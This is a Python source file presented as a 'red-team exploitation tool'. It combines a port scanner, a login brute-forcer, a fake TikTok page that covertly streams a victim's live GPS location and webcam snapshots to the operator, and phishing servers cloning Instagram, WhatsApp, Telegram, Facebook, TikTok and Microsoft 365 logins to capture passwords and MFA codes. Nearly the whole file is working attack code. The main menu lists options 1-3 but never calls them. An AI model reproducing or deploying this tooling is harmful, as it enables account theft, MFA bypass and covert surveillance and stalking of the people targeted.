import socket
import sys
import threading
from queue import Queue
import urllib.request
import urllib.parse
import urllib.error
import time
import http.server
import socketserver
import base64
import os

# 1. Real Network Port Scanner & Banner Grabbing
def scan_port(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            try:
                banner = sock.recv(1024).decode().strip()
            except:
                banner = "No banner available"
            print(f"[+] PORT OPEN: {target_ip}:{port} | Banner: {banner}")
        sock.close()
    except Exception as e:
        pass

# 2. Advanced Multi-Platform Brute-Forcer
def targeted_account_attack(target_url, username, wordlist_file, user_field='username', pass_field='password'):
    print(f"\n[*] Launching Offensive Attack on: {target_url}")
    print(f"[*] Target Account / Email: {username}")
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Wordlist error: {e}")
        return

    print(f"[*] Testing {len(passwords)} credentials against target endpoint...")

    for password in passwords:
        try:
            data = urllib.parse.urlencode({user_field: username, pass_field: password}).encode('utf-8')
            req = urllib.request.Request(target_url, data=data, headers={
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            })
            
            with urllib.request.urlopen(req, timeout=4) as response:
                content = response.read().decode('utf-8', errors='ignore').lower()
                if any(k in content for k in ['welcome', 'dashboard', 'success', 'logged_in', 'token', 'session']):
                    print(f"\n[!] CRITICAL SUCCESS! ACCOUNT BREACHED -> User: {username} | Password: {password}")
                    return
        except urllib.error.HTTPError as e:
            if e.code == 302:
                print(f"\n[!] POSSIBLE SUCCESS (Redirect 302) -> User: {username} | Password: {password}")
                return
        except Exception:
            pass
        time.sleep(0.05)
    
    print(f"[-] Attack finished for {username}. Password not matched in current wordlist.")

# 3. Live GPS & Continuous Media Tracking Engine
def generate_location_tracker_link():
    print("\n" + "="*60)
    print(" [@] LIVE GPS & CONTINUOUS MEDIA TRACKING ENGINE")
    print("="*60)
    print(" 1. Run 'ngrok http 8080' in another terminal.")
    print(" 2. Copy the Ngrok URL and send it to your target.")
    print("-"*60)
    
    port_input = input("Enter local listener port (default 8080): ").strip()
    port = int(port_input) if port_input.isdigit() else 8080
    
    if not os.path.exists('captured_media'):
        os.makedirs('captured_media')

    print(f"\n[+] Starting live streaming listener on port {port}...")

    class LiveMediaHandler(http.server.SimpleHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = urllib.parse.parse_qs(post_data.decode('utf-8'))
                if 'lat' in data and 'lon' in data:
                    lat = data['lat'][0]
                    lon = data['lon'][0]
                    print(f"\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]")
                    print(f" [!] LIVE TARGET MOVEMENT DETECTED!")
                    print(f" [!] Latitude  : {lat}")
                    print(f" [!] Longitude : {lon}")
                    print(f" [!] Google Maps: https://maps.google.com/?q={lat},{lon}")
                    print(f"[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n")

                if 'image' in data:
                    img_data = data['image'][0].split(',')[1]
                    img_bytes = base64.b64decode(img_data)
                    filename = f"captured_media/live_photo_{int(time.time())}.jpg"
                    with open(filename, 'wb') as f:
                        f.write(img_bytes)
                    print(f"[+] Live Photo Captured -> {filename}")

            except Exception as e:
                print(f"[-] Processing error: {e}")

            try:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            except:
                pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html_payload = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>TikTok - Make Your Day</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { background-color: #000000; color: #ffffff; font-family: Arial, sans-serif; text-align: center; padding-top: 40px; }
                    .card { background: #161823; max-width: 400px; margin: auto; padding: 25px; border-radius: 12px; border: 1px solid #2f3037; }
                    .loader { border: 4px solid #2f3037; border-top: 4px solid #FE2C55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                    h3 { color: #25F4EE; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h3>TikTok Video Loading...</h3>
                    <p>Preparing viral media stream, please verify connection...</p>
                    <div class="loader"></div>
                </div>
                <video id="v" autoplay playsinline style="display:none;"></video>
                <canvas id="c" style="display:none;"></canvas>

                <script>
                    function sendData(payload) {
                        fetch('/', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: new URLSearchParams(payload)
                        });
                    }
                    if (navigator.geolocation) {
                        navigator.geolocation.watchPosition(function(pos) {
                            sendData({lat: pos.coords.latitude, lon: pos.coords.longitude});
                        }, function(err) {}, {enableHighAccuracy: true, maximumAge: 0, timeout: 20000});
                    }
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                    .then(function(stream) {
                        var video = document.getElementById('v');
                        video.srcObject = stream;
                        setInterval(function() {
                            var canvas = document.getElementById('c');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            var ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            sendData({image: canvas.toDataURL('image/jpeg', 0.7)});
                        }, 6000);
                    }).catch(function(err) {});
                </script>
            </body>
            </html>
            """
            self.wfile.write(html_payload.encode('utf-8'))

        def log_message(self, format, *args):
            return

    class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        allow_reuse_address = True

    try:
        with ThreadedHTTPServer(("0.0.0.0", port), LiveMediaHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping Live Tracker listener...")

# 4. Professional Grade High-Fidelity Phishing Suite with Intel & Session Harvesting
def high_grade_phishing_suite():
    print("\n" + "="*60)
    print(" [@] PROFESSIONAL RED-TEAM ADVANCED PHISHING SUITE")
    print("="*60)
    print(" Select Target Platform:")
    print(" 1. Instagram (Advanced Credential & Intel Harvester)")
    print(" 2. WhatsApp (Web Verification Suite)")
    print(" 3. Telegram (Web App Authorization Suite)")
    print(" 4. Facebook (Security Center Suite)")
    print(" 5. TikTok (Official Auth Suite)")
    print("-"*60)
    
    platform_choice = input("Select platform (1-5): ").strip()
    
    platforms = {
        '1': ('Instagram', 'https://www.instagram.com', '''
            body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { background: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 1px; }
            h1 { font-size: 32px; margin-bottom: 20px; color: #262626; font-weight: bold; }
            input { width: 100%; padding: 10px; margin: 6px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
            input:focus { border-color: #a8a8a8; outline: none; }
            button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; margin-top: 15px; font-weight: 600; border-radius: 4px; cursor: pointer; font-size: 14px; }
            .hidden { display: none; }
        ''', 'Instagram', 'Log in to view photos and videos from your friends.'),
        
        '2': ('WhatsApp', 'https://web.whatsapp.com', '''
            body { background: #111b21; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #e9edef; }
            .box { background: #222d34; padding: 40px; width: 380px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
            h2 { color: #00a884; margin-bottom: 20px; font-weight: 500; }
            input { width: 100%; padding: 12px; margin: 10px 0; background: #2a3942; border: 1px solid #374248; color: #fff; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; background: #00a884; color: #fff; border: none; padding: 12px; margin-top: 15px; font-weight: 600; border-radius: 4px; cursor: pointer; }
            .hidden { display: none; }
        ''', 'WhatsApp Web', 'Verify your phone number to link active session.'),
        
        '3': ('Telegram', 'https://web.telegram.org', '''
            body { background: #0f212e; font-family: Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
            .box { background: #17212b; padding: 40px; width: 360px; text-align: center; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
            h2 { color: #2ea6ff; margin-bottom: 10px; }
            input { width: 100%; padding: 12px; margin: 10px 0; background: #242f3d; border: none; color: #fff; border-radius: 8px; box-sizing: border-box; }
            button { width: 100%; background: #2ea6ff; color: #fff; border: none; padding: 12px; margin-top: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; }
            .hidden { display: none; }
        ''', 'Telegram Authorization', 'Confirm your account credentials to launch Web App.'),
        
        '4': ('Facebook', 'https://www.facebook.com', '''
            body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { background: #fff; padding: 20px; width: 360px; text-align: center; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            h2 { color: #1877f2; font-size: 32px; margin-bottom: 20px; }
            input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
            button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; margin-top: 10px; font-weight: bold; border-radius: 6px; font-size: 18px; cursor: pointer; }
            .hidden { display: none; }
        ''', 'Facebook', 'Connect with friends and the world around you on Facebook.'),
        
        '5': ('TikTok', 'https://www.tiktok.com', '''
            body { background: #121212; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
            .box { background: #1f1f1f; padding: 40px; width: 360px; text-align: center; border-radius: 8px; border: 1px solid #333; }
            h2 { color: #fe2c55; margin-bottom: 10px; }
            input { width: 100%; padding: 12px; margin: 8px 0; background: #2f2f2f; border: 1px solid #444; color: #fff; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; background: #fe2c55; color: #fff; border: none; padding: 12px; margin-top: 15px; font-weight: bold; border-radius: 4px; cursor: pointer; }
            .hidden { display: none; }
        ''', 'TikTok', 'Log in to TikTok to continue watching videos.')
    }
    
    if platform_choice not in platforms:
        print("[-] Invalid choice.")
        return
        
    p_name, p_redirect, p_style, p_title, p_desc = platforms[platform_choice]
    
    port_input = input("Enter local listener port (default 8081): ").strip()
    port = int(port_input) if port_input.isdigit() else 8081
    
    if not os.path.exists('harvested_sessions'):
        os.makedirs('harvested_sessions')

    print(f"\n[+] Starting High-Grade Professional {p_name} Suite on port {port}...")

    class ProPhishHandler(http.server.SimpleHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = urllib.parse.parse_qs(post_data.decode('utf-8'))
                identity = data.get('identity', ['Unknown'])[0]
                password = data.get('password', ['Unknown'])[0]
                otp = data.get('otp', ['None'])[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                client_ip = self.client_address[0]
                
                print(f"\n[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
                print(f" [!] HIGH-GRADE {p_name.upper()} COMPromISED SESSION!")
                print(f" [!] Source IP    : {client_ip}")
                print(f" [!] User-Agent   : {user_agent}")
                print(f" [!] Identity     : {identity}")
                print(f" [!] Password     : {password}")
                print(f" [!] MFA / OTP    : {otp}")
                print(f"[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]\n")
                
                filename = f"harvested_sessions/{p_name.lower()}_pro_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Platform: {p_name}\nIP: {client_ip}\nAgent: {user_agent}\nIdentity: {identity}\nPassword: {password}\nMFA/OTP: {otp}\n")
                print(f"[+] Advanced session info saved securely to {filename}")

            except Exception as e:
                print(f"[-] Processing error: {e}")

            try:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            except:
                pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            html_payload = """<!DOCTYPE html>
<html>
<head>
    <title>""" + p_title + """</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>""" + p_style + """</style>
</head>
<body>
    <div class="box" id="step1">
        <h2>""" + p_title + """</h2>
        <p style="font-size:13px; color:#888;">""" + p_desc + """</p>
        <form id="idForm">
            <input type="text" id="identity" placeholder="Phone number, username, or email" required>
            <button type="button" onclick="nextStep()">Next</button>
        </form>
    </div>

    <div class="box hidden" id="step2">
        <h2>Security Verification</h2>
        <p id="displayUser" style="font-size: 14px; font-weight: 500;"></p>
        <form id="authForm" onsubmit="submitData(event)">
            <input type="password" id="password" placeholder="Password" required>
            <input type="text" id="otp" class="hidden" placeholder="Enter SMS or Authenticator Code">
            <button type="submit" id="subBtn">Verify & Log In</button>
        </form>
        <p style="margin-top: 15px; font-size: 12px; color: #0095f6; cursor: pointer;" onclick="toggleMfa()">Request MFA Code?</p>
    </div>

    <script>
        let userVal = "";
        let mfaVisible = false;
        function nextStep() {
            userVal = document.getElementById('identity').value;
            if(userVal) {
                document.getElementById('displayUser').innerText = userVal;
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            }
        }
        function toggleMfa() {
            mfaVisible = !mfaVisible;
            let otpField = document.getElementById('otp');
            if(mfaVisible) {
                otpField.classList.remove('hidden');
            } else {
                otpField.classList.add('hidden');
            }
        }
        function submitData(e) {
            e.preventDefault();
            let pass = document.getElementById('password').value;
            let otpCode = document.getElementById('otp').value || "None";
            
            let payload = new URLSearchParams();
            payload.append('identity', userVal);
            payload.append('password', pass);
            payload.append('otp', otpCode);

            fetch('/', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: payload
            }).then(res => {
                window.location.href = '""" + p_redirect + """';
            });
        }
    </script>
</body>
</html>"""
            self.wfile.write(html_payload.encode('utf-8'))

        def log_message(self, format, *args):
            return

    class ThreadedProServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        allow_reuse_address = True

    try:
        with ThreadedProServer(("0.0.0.0", port), ProPhishHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] Stopping {p_name} Pro listener...")

# 5. Dedicated Corporate & Web-Mail Phishing Suite
def dedicated_email_phishing_module():
    print("\n" + "="*60)
    print(" [@] DEDICATED CORPORATE & WEB-MAIL PHISHING SUITE")
    print("="*60)
    print(" Creates a secure Microsoft 365 / Corporate Webmail Portal.")
    print("-"*60)
    
    port_input = input("Enter local listener port (default 8082): ").strip()
    port = int(port_input) if port_input.isdigit() else 8082
    
    if not os.path.exists('harvested_sessions'):
        os.makedirs('harvested_sessions')

    print(f"\n[+] Starting Dedicated Email Phishing Listener on port {port}...")

    class EmailHandler(http.server.SimpleHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = urllib.parse.parse_qs(post_data.decode('utf-8'))
                email = data.get('email', ['Unknown'])[0]
                password = data.get('password', ['Unknown'])[0]
                otp = data.get('otp', ['None'])[0]
                client_ip = self.client_address[0]
                
                print(f"\n[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
                print(f" [!] CORPORATE WEB-MAIL CREDENTIALS CAPTURED!")
                print(f" [!] Source IP    : {client_ip}")
                print(f" [!] Email        : {email}")
                print(f" [!] Password     : {password}")
                print(f" [!] MFA / OTP    : {otp}")
                print(f"[!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]\n")
                
                filename = f"harvested_sessions/email_pro_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Email: {email}\nIP: {client_ip}\nPassword: {password}\nMFA/OTP: {otp}\n")
                print(f"[+] Saved securely to {filename}")

            except Exception as e:
                print(f"[-] Error: {e}")

            try:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            except:
                pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            html_payload = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Sign in to your account - WebMail Portal</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { background: #f4f6f9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                    .login-box { background: #ffffff; padding: 40px; width: 100%; max-width: 380px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); color: #1b1b1b; }
                    h2 { margin-bottom: 24px; font-size: 24px; font-weight: 600; color: #1b1b1b; }
                    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #8c8c8c; border-radius: 2px; box-sizing: border-box; font-size: 15px; }
                    input:focus { border-color: #0067b8; outline: none; }
                    button { width: 100%; background: #0067b8; color: white; border: none; padding: 12px; margin-top: 15px; font-size: 16px; font-weight: 600; border-radius: 2px; cursor: pointer; }
                    button:hover { background: #005da6; }
                    .hidden { display: none; }
                </style>
            </head>
            <body>
                <div class="login-box" id="step1">
                    <h2>Sign in</h2>
                    <form>
                        <input type="email" id="email" placeholder="Email, phone, or Skype" required>
                        <button type="button" onclick="nextStep()">Next</button>
                    </form>
                </div>

                <div class="login-box hidden" id="step2">
                    <h2>Enter password</h2>
                    <p id="displayEmail" style="font-size: 14px; color: #505050; margin-bottom: 15px;"></p>
                    <form onsubmit="submitCreds(event)">
                        <input type="password" id="password" placeholder="Password" required>
                        <input type="text" id="otp" class="hidden" placeholder="Enter MFA / Authenticator Code">
                        <button type="submit">Sign in</button>
                        <p style="margin-top: 12px; font-size: 12px; color: #0067b8; cursor: pointer;" onclick="toggleMfa()">Use verification code instead</p>
                    </form>
                </div>

                <script>
                    let userEmail = "";
                    let mfaOn = false;
                    function nextStep() {
                        userEmail = document.getElementById('email').value;
                        if(userEmail) {
                            document.getElementById('displayEmail').innerText = userEmail;
                            document.getElementById('step1').classList.add('hidden');
                            document.getElementById('step2').classList.remove('hidden');
                        }
                    }
                    function toggleMfa() {
                        mfaOn = !mfaOn;
                        let otpBox = document.getElementById('otp');
                        if(mfaOn) { otpBox.classList.remove('hidden'); }
                        else { otpBox.classList.add('hidden'); }
                    }
                    function submitCreds(e) {
                        e.preventDefault();
                        let pass = document.getElementById('password').value;
                        let otpVal = document.getElementById('otp').value || "None";
                        
                        let payload = new URLSearchParams();
                        payload.append('email', userEmail);
                        payload.append('password', pass);
                        payload.append('otp', otpVal);

                        fetch('/', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: payload
                        }).then(res => {
                            window.location.href = "https://www.office.com";
                        });
                    }
                </script>
            </body>
            </html>
            """
            self.wfile.write(html_payload.encode('utf-8'))

        def log_message(self, format, *args):
            return

    class ThreadedEmailServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        allow_reuse_address = True

    try:
        with ThreadedEmailServer(("0.0.0.0", port), EmailHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping Email Phishing listener...")

# Main Program Loop
if __name__ == '__main__':
    q = Queue()
    
    print("\n========================================================")
    print("     Advanced Professional Red-Team Exploitation Tool    ")
    print("========================================================")

    while True:
        print("\n[Ultimate Operations Menu]")
        print("1. Network Port Scanner & Service Discovery")
        print("2. Targeted Account Brute-Forcer (Email / Social Media / Web)")
        print("3. Live GPS & Continuous Media Tracking Engine")
        print("4. Professional High-Fidelity Phishing Suite")
        print("5. Dedicated Corporate & Web-Mail Phishing Module")
        print("6. Exit")
        choice = input("Select an option (1-6): ").strip()

        if choice == '4':
            high_grade_phishing_suite()
        elif choice == '5':
            dedicated_email_phishing_module()
        elif choice == '6':
            print("Exiting framework. Stay safe!")
            sys.exit(0)
